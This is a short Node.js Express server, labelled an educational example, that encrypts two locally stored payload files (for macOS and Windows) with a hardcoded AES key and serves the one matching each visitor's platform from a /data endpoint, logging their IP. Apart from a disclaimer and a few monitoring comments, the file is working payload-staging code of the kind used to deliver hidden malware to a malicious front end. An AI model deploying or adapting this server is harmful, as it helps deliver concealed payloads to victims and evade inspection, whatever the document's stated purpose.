// ===== EDUCATIONAL EXAMPLE - DO NOT DEPLOY FOR MALICIOUS PURPOSES =====
// This demonstrates how defenders understand attack patterns for detection

const express = require('express');
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

const app = express();

// ===== ENCRYPTION CONFIG (Matches Frontend Keys) =====
const PASSPHRASE = "98yNCjeAfWMwk0wI";

function encryptWithAES(content, passphrase) {
  const algo = 'aes-256-cbc';
  const key = Buffer.from(passphrase.padEnd(32, '\0'));
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algo, key, iv);
  
  let encrypted = cipher.update(content, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  
  return encrypted;
}

// Load payloads from local files
const payloadMac = fs.readFileSync(path.join(__dirname, 'payload-mac.html'), 'utf8');
const payloadWin = fs.readFileSync(path.join(__dirname, 'payload-win.html'), 'utf8');

// Pre-encrypt both payloads (for efficiency)
const encryptedMac = encryptWithAES(payloadMac, PASSPHRASE);
const encryptedWin = encryptWithAES(payloadWin, PASSPHRASE);

// ===== PLATFORM DETECTION LOGIC =====
function detectPlatform(userAgent) {
  if (/mac/i.test(userAgent)) return 'mac';
  return 'win';  // Default fallback
}

// ===== THREAT ENDPOINT =====
app.get('/data', (req, res) => {
  const platformParam = req.query.platform || '';
  const userAgent = req.headers['user-agent'] || '';
  
  // Log for forensic purposes (what defenders would monitor)
  console.log(`[${new Date().toISOString()}] Platform: ${platformParam}, IP: ${req.ip}, UA: ${userAgent.substring(0,50)}...`);
  
  const platform = platformParam || detectPlatform(userAgent);
  const cipher = platform === 'mac' ? encryptedMac : encryptedWin;
  
  // Send encrypted payload
  res.json({ cipher });
});

// ===== DEFENSIVE: Track Abnormal Patterns =====
// Security teams would monitor for:
// - High request rates to /data endpoint
// - Repeated cipher responses from same IP
// - Unusual geographic patterns

module.exports = app;
